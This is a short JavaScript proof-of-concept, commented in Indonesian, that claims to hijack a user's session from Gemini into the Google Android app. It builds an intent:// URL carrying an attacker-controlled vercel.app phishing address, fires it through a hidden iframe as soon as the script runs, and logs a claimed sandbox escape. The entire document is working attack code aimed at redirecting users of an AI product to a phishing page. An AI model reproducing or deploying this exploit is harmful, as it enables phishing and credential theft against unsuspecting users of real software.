/**
 * PoC: Full Context Hijack via Google Search Box
 * Dampak: Mengalihkan user dari Gemini ke Phishing page di dalam Aplikasi Google
 */
function triggerFullHijack() {
    log.info("🚀 Menjalankan Rantai Serangan: Full Context Hijack...");

    // URL phishing yang dikendalikan penyerang (disamarkan)
    const attackerUrl = "https://vercel-app-sigma-five.vercel.app/"; 
    
    // Intent untuk melompat ke aplikasi Google dan memuat URL penyerang
    const finalIntent = `intent://www.google.com/gasearch?q=${encodeURIComponent(attackerUrl)}#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end`;

    log.warn("🚨 Memicu pelarian bingkai... Perhatikan aplikasi Google yang terbuka.");

    const ifr = document.createElement('iframe');
    ifr.style.display = 'none';
    ifr.src = finalIntent;
    document.body.appendChild(ifr);

    log.success("✔ Sandbox escaped. User dialihkan ke aplikasi eksternal.");
}

triggerFullHijack();